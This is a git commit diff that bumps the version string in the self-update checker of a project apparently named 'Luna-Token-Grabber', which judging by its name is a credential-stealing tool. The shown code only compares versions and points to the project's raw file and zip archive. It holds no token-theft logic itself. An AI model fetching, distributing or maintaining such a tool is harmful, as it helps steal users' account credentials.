9648b1f5acf18ac4b8f0a3f81a62239165a6252b
judem909 <99215486+judem909@users.noreply.github.com>
2023-02-02 19:45:42 +0000

    new version

--- tools/update.py
+++ tools/update.py
@@ -7,14 +7,14 @@ import requests
 
 class Update():
     def __init__(self):
-        self.version = '1.3.2'
+        self.version = '1.3.3'
         self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/tools/update.py'
         self.zipfile = 'https://github.com/Smug246/Luna-Token-Grabber/archive/refs/heads/main.zip'
         self.update_checker()
 
     def update_checker(self):
         code = requests.get(self.github).text
-        if "self.version = '1.3.2'" in code:
+        if "self.version = '1.3.3'" in code:
             print('This version is up to date!')
             print('Exiting...')
             sleep(2)
